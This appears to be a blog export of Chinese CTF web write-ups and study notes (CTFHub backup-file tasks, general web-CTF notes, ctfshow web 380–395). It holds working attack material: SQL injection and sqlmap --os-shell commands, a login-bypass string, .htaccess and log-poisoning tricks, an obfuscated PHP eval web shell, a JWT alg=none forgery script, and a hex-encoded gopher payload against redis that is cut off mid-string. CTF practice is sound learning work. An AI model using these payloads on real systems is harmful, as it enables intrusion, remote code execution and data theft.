<span class="string">&#x27;utf-8&#x27;</span></span><br><span class="line">        <span class="variable">get_file</span>=<span class="variable">r.text</span></span><br><span class="line">        <span class="variable"><span class="keyword">if</span></span> <span class="string">&quot;flag.txt&quot;</span> <span class="variable"><span class="keyword">in</span></span> <span class="variable">get_file</span>:</span><br><span class="line">            <span class="function"><span class="title">print</span>(<span class="variable">a</span>)</span></span><br></pre></td></tr></table></figure>


<h1 id="PHPINFO"><a href="#PHPINFO" class="headerlink" title="PHPINFO"></a>PHPINFO</h1><p><code>Ctrl+F</code>搜索flag</p>
<p>要注意下ctfhub后面有个空格，要删掉</p>
<h1 id="备份文件下载"><a href="#备份文件下载" class="headerlink" title="备份文件下载"></a>备份文件下载</h1><h2 id="网站源码"><a href="#网站源码" class="headerlink" title="网站源码"></a>网站源码</h2><p>拿disearch扫一下</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">python</span> dirsearch.py -u http://challenge-d<span class="number">7</span>b<span class="number">90</span>efa<span class="number">6684</span>f<span class="number">0</span>b<span class="number">0</span>.sandbox.ctfhub.com:<span class="number">10080</span>/ -e *</span><br></pre></td></tr></table></figure>
<p>可以发现<a href="http://www.zip,访问下载/">www.zip，访问下载</a></p>
<p>可以发现里面有三个文件</p>
<p><img src="https://s1.ax1x.com/2020/04/22/JYjos1.png"></p>
<p>urlf访问<code>.txt</code>,得到flag</p>
<h2 id="bak文件"><a href="#bak文件" class="headerlink" title="bak文件"></a>bak文件</h2><p>题目提示Flag in index.php source code</p>
<p>访问<code>index.php.bak</code>下载得到源码，flag在源码里</p>
<h2 id="vim缓存"><a href="#vim缓存" class="headerlink" title="vim缓存"></a>vim缓存</h2><pre><code>  程序员使用vim编辑器编写一个`index.php`文件时，会有一个`.index.php.swp`文件，如果文件正常退出，则该文件被删除，如果异常退出，该文件则会保存下来
</code></pre>
<p>访问<code>.index.php.swp</code>,下载文件，记事本打开，<code>Ctrl+F</code>搜索<code>ctfhub</code>得到flag</p>
<h2 id="DS-Store"><a href="#DS-Store" class="headerlink" title=".DS_Store"></a>.DS_Store</h2><p>.DS_Store是Mac下Finder用来保存如何展示 文件/文件夹 的数据文件，每个文件夹下对应一个。如果开发/设计人员在发布代码时未删除文件夹中隐藏的.DS_store，则有可能会造成文件泄露</p>
<p>访问<code>http://url/.DS_Store</code>,下载文件</p>
<p>打开后发现乱码，使用.DS_Store 的解析工具Python-dsstore进行文件的解析。</p>
<p>等到的文件url访问，等到flag</p>
]]></content>
      <categories>
        <category>Write up</category>
      </categories>
  </entry>
  <entry>
    <title>ctf web笔记</title>
    <url>/2020/04/07/ctf-web%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>ctf-web学习笔记（2020.4.7）</p>
<a id="more"></a>

<h1 id="域名解析"><a href="#域名解析" class="headerlink" title="域名解析"></a>域名解析</h1><p>   <code>C:\Windows\System32\drivers\etc</code></p>
<hr>
<h1 id="文件包含漏洞利用"><a href="#文件包含漏洞利用" class="headerlink" title="文件包含漏洞利用"></a>文件包含漏洞利用</h1><p>   <a href="https://www.freebuf.com/articles/web/182280.htm" target="_blank">Web安全实战系列：文件包含漏洞 </a></p>
<hr>
<h1 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h1><p> <a href="https://deerchao.cn/tutorials/regex/regex-1.htm">正则表达式</a></p>
<table>
<thead>
<tr>
<th align="center">代码语法</th>
<th align="center">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">.</td>
<td align="center">匹配除换行符以外的任意字符</td>
</tr>
<tr>
<td align="center">\w</td>
<td align="center">匹配字母或数字</td>
</tr>
<tr>
<td align="center">\s</td>
<td align="center">匹配任意的空白符</td>
</tr>
<tr>
<td align="center">\d</td>
<td align="center">匹配数字</td>
</tr>
<tr>
<td align="center">\b</td>
<td align="center">匹配单词的开始或结束</td>
</tr>
<tr>
<td align="center">^</td>
<td align="center">匹配字符串的开始</td>
</tr>
<tr>
<td align="center">$</td>
<td align="center">匹配字符串的结束</td>
</tr>
</tbody></table>
<hr>
<h1 id="拼图"><a href="#拼图" class="headerlink" title="拼图"></a>拼图</h1><figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line">montage *.<span class="keyword">jpg </span>-tile MxN -geometry axb+<span class="number">0</span>+<span class="number">0</span> out.<span class="keyword">jpg </span>   (合成一张大图)</span><br><span class="line"></span><br><span class="line">将目录中的<span class="keyword">jpg文件按顺序拼成x轴M块，y轴N块，每个图块大小为axb像素，输出文件为out.jpg </span>   </span><br></pre></td></tr></table></figure>
<figure class="highlight brainfuck"><table><tr><td class="code"><pre><span class="line"><span class="comment">gaps</span> --<span class="comment">image=out</span><span class="string">.</span><span class="comment">jpg</span> --<span class="comment">generations=50</span> --<span class="comment">population=120</span> --<span class="comment">size=50</span>   <span class="comment">（拼图）</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span>--<span class="comment">image</span>            <span class="comment">指向拼图的路径</span></span><br><span class="line"><span class="comment"></span>--<span class="comment">size</span>            <span class="comment">拼图块的像素尺寸</span></span><br><span class="line"><span class="comment"></span>--<span class="comment">generations</span>    <span class="comment">遗传算法的代的数量</span></span><br><span class="line"><span class="comment"></span>--<span class="comment">population</span>    <span class="comment">个体数量</span></span><br><span class="line"><span class="comment"></span>--<span class="comment">verbose</span>        <span class="comment">每一代训练结束后展示最佳结果</span></span><br><span class="line"><span class="comment"></span>--<span class="comment">save</span>            <span class="comment">将拼图还原为图像</span></span><br></pre></td></tr></table></figure>
<hr>
<h1 id="PHP中的全局变量global和-GLOBALS的区别"><a href="#PHP中的全局变量global和-GLOBALS的区别" class="headerlink" title="PHP中的全局变量global和$GLOBALS的区别"></a>PHP中的全局变量global和$GLOBALS的区别</h1><ul>
<li>globle<br>​    Global的作用是定义全局变量,但是这个全局变量不是应用于整个网站,而是应用于当前页面,包括include       或require的所有文件。</li>
<li>$GLOBALS<br>   　在 $GLOBALS 数组中，每一个变量为一个元素，键名对应变量名，值对应变量的内容。$GLOBALS 之所以在全局范围内存在，是因为 $GLOBALS 是一个超全局变量。注意$GLOBALS 的写法，比如变量$a1,写法为$GLOBALS[‘a1’]。<br>   　$GLOBALS [一个包含了全部变量的全局组合数组]</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test_global</span>(<span class="params"></span>) </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line"><span class="keyword">global</span> <span class="variable">$var1</span>, <span class="variable">$var2</span>; </span><br><span class="line"><span class="variable">$var2</span> =&amp; <span class="variable">$var1</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test_globals</span>(<span class="params"></span>) </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line"><span class="variable">$GLOBALS</span>[<span class="string">&#x27;var3&#x27;</span>] =&amp; <span class="variable">$GLOBALS</span>[<span class="string">&#x27;var1&#x27;</span>]; </span><br><span class="line">&#125; </span><br><span class="line"><span class="variable">$var1</span> = <span class="number">5</span>; </span><br><span class="line"><span class="variable">$var2</span> = <span class="variable">$var3</span> = <span class="number">0</span>; </span><br><span class="line"></span><br><span class="line">test_global(); </span><br><span class="line"><span class="keyword">print</span> <span class="variable">$var2</span>; <span class="comment">//输出结果为0</span></span><br><span class="line"></span><br><span class="line">test_globals(); </span><br><span class="line"><span class="keyword">print</span> <span class="variable">$var3</span>; <span class="comment">//输结果为05</span></span><br></pre></td></tr></table></figure>
<hr>
<h1 id="file-get-contents-fn"><a href="#file-get-contents-fn" class="headerlink" title="file_get_contents($fn)"></a>file_get_contents($fn)</h1><p>file_get_contents功能是从文件名为“$fn”的文件中读取数据，但是当$fn的值为“php://input”，它会接受并返回post的值</p>
<hr>
<h1 id="htaccess文件解析"><a href="#htaccess文件解析" class="headerlink" title="htaccess文件解析"></a>htaccess文件解析</h1><p>如果Apache中.htaccess可被执行并可被上传，那么可以尝试在.htaccess中写入：</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="section">&lt;FilesMatch <span class="string">&quot;shell.jpg&quot;</span>&gt;</span></span><br><span class="line"><span class="attribute"><span class="nomarkup">SetHandler</span></span> application/x-httpd-php</span><br><span class="line"><span class="section">&lt;/FilesMatch&gt;</span></span><br></pre></td></tr></table></figure>
<p>然后再上传shell.jpg的木马，这样shell.jpg就可被解析为PHP文件了。</p>
<h1 id="Disearch"><a href="#Disearch" class="headerlink" title="Disearch"></a>Disearch</h1><figure class="highlight mel"><table><tr><td class="code"><pre><span class="line"><span class="keyword">python</span> D:\<span class="keyword">file</span>\dirsearch\dirsearch.py -u http:<span class="comment">//148.70.62.239:10091/ -e *</span></span><br></pre></td></tr></table></figure>
<hr>
<h1 id="MD5漏洞"><a href="#MD5漏洞" class="headerlink" title="MD5漏洞"></a>MD5漏洞</h1><figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line">1. 如果两个字符经MD5加密后的值为 0exxxxx形式，就会被认为是科学计数法，且表示的是0*10的xxxx次方，还是零，都是相等的。</span><br><span class="line"></span><br><span class="line">下列的字符串的MD5值都是<span class="number">0</span><span class="built_in">e</span>开头的：</span><br><span class="line">QNKCDZO</span><br><span class="line"><span class="number">240610708</span></span><br><span class="line">s878926199a</span><br><span class="line">s155964671a</span><br><span class="line">s214587387a</span><br><span class="line">s214587387a</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> md5()函数无法处理数组，如果传入的为数组，会返回<span class="literal">NULL</span>，所以两个数组经过加密后得到的都是<span class="literal">NULL</span>,也就是相等的。</span><br></pre></td></tr></table></figure>
<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><h2 id="md5-password-true"><a href="#md5-password-true" class="headerlink" title="md5($password,true)"></a>md5($password,true)</h2><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">sql注入中 该函数的输出是原始二进制格式，会被作为字符串处理。因此我们希望构建一个字符串，这个字符串经过md5加密后输出的原始二进制（作为字符串处理）刚好是注入语句。</span><br><span class="line">要让md5(<span class="variable">$password</span>,true) 编码后 二进制转字符串为  <span class="string">&#x27;or &#x27;</span>xxx</span><br><span class="line">这样sql 为    and password=<span class="string">&#x27;&#x27;</span>o<span class="string">r&#x27;xx&#x27;</span>   <span class="string">&#x27;&#x27;</span>o<span class="string">r&#x27;xx&#x27;</span>=true    这样查询结果为真</span><br><span class="line">生成md5(<span class="string">&#x27;key&#x27;</span>,true)二进制序列化为<span class="string">&#x27;or&#x27;</span>开头的有：</span><br><span class="line">e58  </span><br><span class="line">ffifdyop  </span><br><span class="line"><span class="number">129581926211651571912466741651878684928</span></span><br></pre></td></tr></table></figure>
<h1 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h1><h3 id="POST型"><a href="#POST型" class="headerlink" title="POST型"></a>POST型</h3><figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>. python <span class="regexp">/usr/</span>share<span class="regexp">/sqlmap/</span>sqlmap.py -r <span class="number">1</span>.txt -p id --current-db</span><br><span class="line"><span class="number">2</span>. python <span class="regexp">/usr/</span>share<span class="regexp">/sqlmap/</span>sqlmap.py -r <span class="number">1</span>.txt -p id -D skctf_flag</span><br><span class="line"><span class="number">3</span>. python <span class="regexp">/usr/</span>share<span class="regexp">/sqlmap/</span>sqlmap.py -r <span class="number">1</span>.txt -p id -D skctf_flag --tables</span><br><span class="line"><span class="number">4</span>. python <span class="regexp">/usr/</span>share<span class="regexp">/sqlmap/</span>sqlmap.py -r <span class="number">1</span>.txt -p id -D skctf_flag -T fl4g --columns</span><br><span class="line"><span class="number">5</span>. python <span class="regexp">/usr/</span>share<span class="regexp">/sqlmap/</span>sqlmap.py -r <span class="number">1</span>.txt -p id -D skctf_flag -T fl4g -C <span class="string">&quot;skctf_flag&quot;</span> --<span class="keyword">dump</span></span><br></pre></td></tr></table></figure>
<figure class="highlight gauss"><table><tr><td class="code"><pre><span class="line">sql手动注入</span><br><span class="line">第一步：判断环境，寻找注入点</span><br><span class="line">  确定注入点：用’报错就有注入的希望 <span class="keyword">and</span> <span class="number">1</span>=<span class="number">1</span> 正常 <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> 报错就基本能注入</span><br><span class="line">第二步：猜解字段</span><br><span class="line">  &#x27; order by <span class="number">3</span> <span class="meta"># </span></span><br><span class="line">第三步：联合查询</span><br><span class="line">  <span class="number">0</span>&#x27; <span class="built_in">union</span> <span class="built_in">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span><span class="meta">#</span></span><br><span class="line">第四步：爆表</span><br><span class="line">    <span class="number">0</span>&#x27; <span class="built_in">union</span> <span class="built_in">select</span> <span class="number">1</span>,<span class="built_in">database</span>(),<span class="built_in">user</span>(),<span class="built_in">version</span>()<span class="meta">#</span></span><br><span class="line">  </span><br><span class="line">   [查表名] id=<span class="number">0</span>&#x27; <span class="built_in">union</span> <span class="built_in">select</span> <span class="number">1</span>,(<span class="built_in">select</span> <span class="built_in">group_concat</span>(table_name) from information_schema.tables wheretable_schema=<span class="built_in">database</span>()),<span class="built_in">user</span>(),<span class="built_in">version</span>()<span class="meta">#           </span></span><br><span class="line">  </span><br><span class="line">   [查列名]id=<span class="number">0</span>&#x27; <span class="built_in">union</span> <span class="built_in">select</span> <span class="number">1</span>,(<span class="built_in">select</span> <span class="built_in">group_concat</span>(column_name) from information_schema.columns <span class="built_in">where</span> table_schema=<span class="built_in">database</span>()<span class="keyword">and</span> table_name=&#x27;表名‘),<span class="built_in">user</span>(),<span class="built_in">version</span>()<span class="meta">#           </span></span><br><span class="line">  </span><br><span class="line">   [查数据]id=<span class="number">0</span>&#x27; <span class="built_in">union</span> <span class="built_in">select</span> <span class="number">1</span>，(<span class="built_in">select</span> 列名 from 表名),<span class="built_in">user</span>(),<span class="built_in">version</span>()<span class="meta">#         </span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title>ctfshow-web入门-黑盒测试</title>
    <url>/2021/10/13/ctfshow-web%E5%85%A5%E9%97%A8-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/</url>
    <content><![CDATA[<p>这两天刷了下ctfshow-web入门的黑盒测试题目，下面是wp<a id="more"></a></p>
<p>[toc]</p>
<h1 id="web-380-（目录扫描）"><a href="#web-380-（目录扫描）" class="headerlink" title="web 380 （目录扫描）"></a>web 380 （目录扫描）</h1><p>后台目录扫描发现page.php</p>
<p>payload: <code>page.php?id=flag</code></p>
<h1 id="web-381-（css路径）"><a href="#web-381-（css路径）" class="headerlink" title="web 381  （css路径）"></a>web 381  （css路径）</h1><p>查看源码，发现一个奇怪的路径</p>
<img src="http://img.npfs06.top/20211004225636.png" style="zoom:80%;">



<p>访问/alsckdfy/即可获得flag</p>
<h1 id="web-382-（万能密码-爆破-sqlmap）"><a href="#web-382-（万能密码-爆破-sqlmap）" class="headerlink" title="web 382 （万能密码/爆破/sqlmap）"></a>web 382 （万能密码/爆破/sqlmap）</h1><p>解法一：</p>
<p>后台万能密码登录 /alsckdfy/</p>
<p><code> admin &#39;or ‘1’=‘1’#</code> </p>
<img src="http://img.npfs06.top/20211004230015.png" style="zoom:80%;">

<p>登录即可拿到flag</p>
<p>解法二：</p>
<p>爆破常用用户名密码</p>
<img src="http://img.npfs06.top/20211004225837.png" style="zoom:80%;">

<p>得到admin/admin888</p>
<p>解法三：</p>
<p>sqlmap</p>
<img src="http://img.npfs06.top/20211004230453.png" style="zoom:80%;">



<p><code>python sqlmap.py -l &quot;1.txt&quot; -p p -D ctfshow -T admin_user -C password --dump</code></p>
<img src="http://img.npfs06.top/20211004231124.png" style="zoom:80%;">



<h1 id="web-383-万能密码-爆破-sqlmap"><a href="#web-383-万能密码-爆破-sqlmap" class="headerlink" title="web 383 (万能密码/爆破/sqlmap)"></a>web 383 (万能密码/爆破/sqlmap)</h1><p>同 382</p>
<h1 id="web-384-爆破"><a href="#web-384-爆破" class="headerlink" title="web 384 (爆破)"></a>web 384 (爆破)</h1><p>根据提示</p>
<blockquote>
<p>密码前2位是小写字母，后三位是数字</p>
</blockquote>
<p>直接后台 /alsckdfy/ 抓包爆破，账号为amdin,得到密码为xy123</p>
<h1 id="web-385-（配置文件利用）"><a href="#web-385-（配置文件利用）" class="headerlink" title="web 385 （配置文件利用）"></a>web 385 （配置文件利用）</h1><p> 目录扫描，得到install</p>
<img src="http://img.npfs06.top/20211004232125.png" style="zoom:80%;">

<p>访问install/?install重置默认密码(admin888)，登入即可</p>
<img src="http://img.npfs06.top/20211004231716.png" style="zoom:80%;">





<h1 id="web-386-（配置文件利用）"><a href="#web-386-（配置文件利用）" class="headerlink" title="web 386 （配置文件利用）"></a>web 386 （配置文件利用）</h1><p>目录扫描得到如下</p>
<img src="http://img.npfs06.top/20211005174235.png" style="zoom:80%;">

<p>/install/</p>
<img src="http://img.npfs06.top/20211005174206.png" style="zoom:80%;">

<p>/clear.php</p>
<img src="http://img.npfs06.top/20211005175233.png" style="zoom:80%;">



<p>/install/</p>
<img src="http://img.npfs06.top/20211005175314.png" style="zoom:80%;">

<p>接下去就是和web385一样的流程了</p>
<h1 id="web-387-（日志文件包含）"><a href="#web-387-（日志文件包含）" class="headerlink" title="web 387 （日志文件包含）"></a>web 387 （日志文件包含）</h1><blockquote>
<p>hint:前面部分和386一样</p>
</blockquote>
<p>/install/</p>
<img src="http://img.npfs06.top/20211011151210.png" style="zoom:80%;">



<p>clear.php</p>
<img src="http://img.npfs06.top/20211011151053.png" style="zoom:80%;">

<p>但是发现这题无法删除lock.dat</p>
<img src="http://img.npfs06.top/20211011151257.png" style="zoom:80%;">



<p>随手一个robots.txt</p>
<img src="http://img.npfs06.top/20211005175859.png" style="zoom:80%;">

<p>得到个目录/debug</p>
<img src="http://img.npfs06.top/20211005180038.png" style="zoom:80%;">



<p>相似的套路，传个参数file</p>
<img src="http://img.npfs06.top/20211005180120.png" style="zoom:80%;">

<p>成功，接下去就是想办法读flag了</p>
<p>读日志试下 （关于日志文件包含可以参考我之前的文章 <a href="https://npfs06.top/2020/07/04/%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" target="_blank">日志文件包含</a>）</p>
<img src="http://img.npfs06.top/20211005180301.png" style="zoom:80%;">



<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">user-agent:<span class="meta">&lt;?php</span> unlink(<span class="string">&#x27;/var/www/html/install/lock.dat&#x27;</span>)<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<img src="http://img.npfs06.top/20211011160311.png" style="zoom:80%;">



<p>删除安装文件</p>
<p>接下去的流程就和web385一样了</p>
<img src="http://img.npfs06.top/20211011160329.png" style="zoom:80%;">

<h1 id="web-388-（CVE-2017-1002024-免杀马）"><a href="#web-388-（CVE-2017-1002024-免杀马）" class="headerlink" title="web 388 （CVE-2017-1002024/免杀马）"></a>web 388 （CVE-2017-1002024/免杀马）</h1><img src="http://img.npfs06.top/20211012151044.png" style="zoom:80%;">

<p>扫到一个目录</p>
<blockquote>
<p>/alsckdfy/editor/</p>
</blockquote>
<img src="http://img.npfs06.top/20211012151434.png" style="zoom:80%;">

<p>是个kindeditor的编辑器，看下版本是4.1.11</p>
<img src="http://img.npfs06.top/20211012151419.png" style="zoom:80%;">



<p>百度查下相应漏洞 <a href="https://wiki.96.mk/Web%E5%AE%89%E5%85%A8/Kindeditor/%EF%BC%88CVE-2017-1002024%EF%BC%89Kindeditor%20%3C%3D4.1.11%20%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" target="_blank">CVE-2017-1002024</a></p>
<img src="http://img.npfs06.top/20211012153116.png" style="zoom:80%;">

<p>发现只允许上传如上格式文件</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;&lt;?ph&#x27;</span>.<span class="string">&#x27;p ev&#x27;</span>.<span class="string">&#x27;al($_PO&#x27;</span>.<span class="string">&#x27;ST[1]);?&gt;&#x27;</span>;</span><br><span class="line">file_put_contents(<span class="string">&#x27;/var/www/html/1.php&#x27;</span>,<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<img src="http://img.npfs06.top/20211012153456.png" style="zoom:80%;">

<p>上传一个txt文件，内容如上</p>
<img src="http://img.npfs06.top/20211012153519.png" style="zoom:80%;">

<p>上传成功</p>
<ul>
<li>通过<code>/debug/?file=</code>参数传给日志文件</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;debug&#x2F;?file&#x3D;&#x2F;var&#x2F;www&#x2F;html&#x2F;alsckdfy&#x2F;attached&#x2F;file&#x2F;20211012&#x2F;20211012073242_61370.txt</span><br></pre></td></tr></table></figure>
<ul>
<li>访问日志文件。执行一句话</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;debug&#x2F;?file&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</span><br></pre></td></tr></table></figure>
<p><strong>不需要显示</strong></p>
<ul>
<li>访问<code>1.php</code>,包含成功执行rce</li>
</ul>
<img src="http://img.npfs06.top/20211012153706.png" style="zoom:80%;">

<p>查看源码即可得到flag</p>
<h1 id="web-389-（session伪造-jwt-日志文件包含）"><a href="#web-389-（session伪造-jwt-日志文件包含）" class="headerlink" title="web 389 （session伪造/jwt/日志文件包含）"></a>web 389 （session伪造/jwt/日志文件包含）</h1><p>访问debug 权限不足</p>
<img src="http://img.npfs06.top/20211012153900.png" style="zoom:80%;">

<img src="http://img.npfs06.top/20211012154305.png" style="zoom:80%;">

<p>结合权限相问题，考虑到session存在问题，看到eyjh开头，条件反射想到jwt</p>
<p>关于jwt攻击，可以看我之前写的文章 <a href="https://npfs06.top/2020/07/27/jwt%E6%94%BB%E5%87%BB/" target="_blank">jwt攻击学习</a></p>
<img src="http://img.npfs06.top/20211012154424.png" style="zoom:80%;">

<p>可以看到用户为user，我们要将其修改为admin,首先爆破secret，但是发现爆破不出来，尝试用空加密算法</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line">token = jwt.encode(</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;iss&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">  <span class="string">&quot;iat&quot;</span>: <span class="number">1634024331</span>,</span><br><span class="line">  <span class="string">&quot;exp&quot;</span>: <span class="number">1634031531</span>,</span><br><span class="line">  <span class="string">&quot;nbf&quot;</span>: <span class="number">1634024331</span>,</span><br><span class="line">  <span class="string">&quot;sub&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">  <span class="string">&quot;jti&quot;</span>: <span class="string">&quot;ae90bdc9a931244e163fea13c5baae44&quot;</span></span><br><span class="line">&#125;,</span><br><span class="line">algorithm=<span class="string">&quot;none&quot;</span>,key=<span class="string">&quot;&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">print(token.encode(<span class="string">&quot;utf-8&quot;</span>).decode(<span class="string">&quot;utf-8&quot;</span>))</span><br></pre></td></tr></table></figure>
<img src="http://img.npfs06.top/20211012164433.png" style="zoom:80%;">

<p>替换下cookie，成功得到权限</p>
<img src="http://img.npfs06.top/20211012164451.png" style="zoom:80%;">

<p>接下去的流程就和web389一样了</p>
<p>上传文件 —&gt; debug?file 写入日志  —&gt; 访问日志文件 —&gt; getshell</p>
<img src="http://img.npfs06.top/20211012164729.png" style="zoom:80%;">

<img src="http://img.npfs06.top/20211012165105.png" style="zoom:80%;">

<h1 id="web-390-（sql注入）"><a href="#web-390-（sql注入）" class="headerlink" title="web 390 （sql注入）"></a>web 390 （sql注入）</h1><p>sql注入</p>
<blockquote>
<p>python sqlmap.py -u “<a href="http://726cd839-3d5c-4092-b0ae-d4753b7b5ef9.challenge.ctf.show:8080/page.php?id=1&quot;">http://726cd839-3d5c-4092-b0ae-d4753b7b5ef9.challenge.ctf.show:8080/page.php?id=1&quot;</a> –os-shell</p>
</blockquote>
<img src="http://img.npfs06.top/20211012170159.png" style="zoom:80%;">



<img src="http://img.npfs06.top/20211012165745.png" style="zoom:80%;">



<h1 id="web-391-（sql注入）"><a href="#web-391-（sql注入）" class="headerlink" title="web 391 （sql注入）"></a>web 391 （sql注入）</h1><p>还是sql注入</p>
<p>注入点在title搜索框</p>
<img src="http://img.npfs06.top/20211012165942.png" style="zoom:80%;">



<blockquote>
<p>python sqlmap.py -u “<a href="http://b6943d5d-2d10-4394-bdce-9f34e0f3d616.challenge.ctf.show:8080/search.php?title=1&quot;">http://b6943d5d-2d10-4394-bdce-9f34e0f3d616.challenge.ctf.show:8080/search.php?title=1&quot;</a> –os-shell</p>
</blockquote>
<h1 id="web-392-（sql注入）"><a href="#web-392-（sql注入）" class="headerlink" title="web 392 （sql注入）"></a>web 392 （sql注入）</h1><p>和上题一样，title存在注入点</p>
<p>flag在根目录</p>
<img src="http://img.npfs06.top/20211012171016.png" style="zoom:80%;">





<h1 id="web-393-（堆叠注入）"><a href="#web-393-（堆叠注入）" class="headerlink" title="web 393 （堆叠注入）"></a>web 393 （堆叠注入）</h1><p>相比前面的题，该题多了个搜索引擎</p>
<img src="http://img.npfs06.top/20211012180251.png" style="zoom:80%;">

<p>访问百度，显示的就是百度的页面，尝试搜索，但是并不会跳转正常的百度搜索结果出来，那么可以猜测这个是从数据库中调用出来的</p>
<p>注入点还是在title，但是不能用 –os-shell </p>
<img src="http://img.npfs06.top/20211012174837.png" style="zoom:80%;">



<blockquote>
<p>python sqlmap.py -u “<a href="http://4d5922c6-6877-4708-984c-740bb5c577d3.challenge.ctf.show:8080/search.php?title=q&quot;">http://4d5922c6-6877-4708-984c-740bb5c577d3.challenge.ctf.show:8080/search.php?title=q&quot;</a> -D “ctfshow” –tables –dump</p>
</blockquote>
<img src="http://img.npfs06.top/20211012180446.png" style="zoom:80%;">



<blockquote>
<p>python sqlmap.py -u “<a href="http://4d5922c6-6877-4708-984c-740bb5c577d3.challenge.ctf.show:8080/search.php?title=q&quot;">http://4d5922c6-6877-4708-984c-740bb5c577d3.challenge.ctf.show:8080/search.php?title=q&quot;</a> -D “ctfshow” -T “link” –columns –dump</p>
</blockquote>
<img src="http://img.npfs06.top/20211012180459.png" style="zoom:80%;">

<p>这里有个url，结合前面的搜索引擎，思路是将这里的url修改为<code>file:///flag</code></p>
<blockquote>
<p>?title=aa’;update link set url=’file:///flag’;select 1,2,’a</p>
</blockquote>
<p>之后随便访问个搜索引擎，就会显示flag</p>
<img src="http://img.npfs06.top/20211012180623.png" style="zoom:80%;">



<h1 id="web-394-（堆叠注入）"><a href="#web-394-（堆叠注入）" class="headerlink" title="web 394 （堆叠注入）"></a>web 394 （堆叠注入）</h1><p>和上题一样, title处存在sql注入</p>
<p>也存在一个link表，表里有个url列名</p>
<p>原理和上题一样，不过在这题使用十六进制编码绕过</p>
<img src="http://img.npfs06.top/20211014160803.png" style="zoom:80%;">



<blockquote>
<p>?title=aa’;update link set url=0x66696C653A2F2F2F7661722F7777772F68746D6C2F616C73636B6466792F636865636B2E706870;select 1,2,’a</p>
</blockquote>
<p>之后随便访问个搜索引擎查看源代码</p>
<img src="http://img.npfs06.top/20211014160526.png" style="zoom:80%;">



<h1 id="web-395-（堆叠注入-redis）"><a href="#web-395-（堆叠注入-redis）" class="headerlink" title="web 395 （堆叠注入/redis）"></a>web 395 （堆叠注入/redis）</h1><p>和上题一样</p>
<blockquote>
<p>?title=aa’;update link set url=0x66696C653A2F2F2F7661722F7777772F68746D6C2F616C73636B6466792F636865636B2E706870;select 1,2,’a</p>
</blockquote>
<p>看了羽师傅的wp发现还有一种解法就是攻击redis服务</p>
<p>题中url字段默认长度最长为255，我们首先需要修改这个默认长度</p>
<blockquote>
<p>search.php?title=1’;alter table link modify column url text;</p>
</blockquote>
<p>然后就是通过gopher生成攻击payload</p>
<img src="http://img.npfs06.top/20211015202547.png" style="zoom:80%;">



<p>hex编码后，payload如下</p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">search.php?title=<span class="number">1</span>&#x27;;insert into link values(6,&#x27;a&#x27;,0x676f<span class="number">70686572</span>3a2f2f<span class="number">313237</span>2e302e302e313a<span class="number">36333739</span>2f5f<span class="number">25324131253044</span><span class="number">25304125323438</span><span class="number">25304425304166</span>6c<span class="number">75736861</span>6c6c<span class="number">25304425304125</span><span class="number">32413325304425</span><span class="number">30412532343325</span><span class="number">30442530417365</span><span class="number">74253044253041</span><span class="number">25323431253044</span><span class="number">25304131253044</span><span class="number">25304125323433</span><span class="number">30253044253041</span><span class="number">25304125304125</span><span class="number">33432533467068</span><span class="number">70253230657661</span>6c<span class="number">253238253234</span>5f504f<span class="number">535425354263</span>6d<span class="number">64253544253239</span><span class="number">25334225334625</span><span class="number">33452530412530</span><span class="number">41253044253041</span><span class="number">25324134253044</span><span class="number">25304125323436</span><span class="number">25304425304163</span>6f6e<span class="number">66696725304425</span><span class="number">30412532343325</span><span class="number">30442530417365</span><span class="number">74253044253041</span><span class="number">25323433253044</span><span class="number">25304164697225</span><span class="number">30442530412532</span><span class="number">34313325304425</span><span class="number">3041</span>2f<span class="number">766172</span>2f<span class="number">777777</span>2f<span class="number">6874</span>6d6c<span class="number">25304425304125</span><span class="number">32413425304425</span><span class="number">30412532343625</span><span class="number">304425304163</span>6f6e<span class="number">66696725304425</span><span 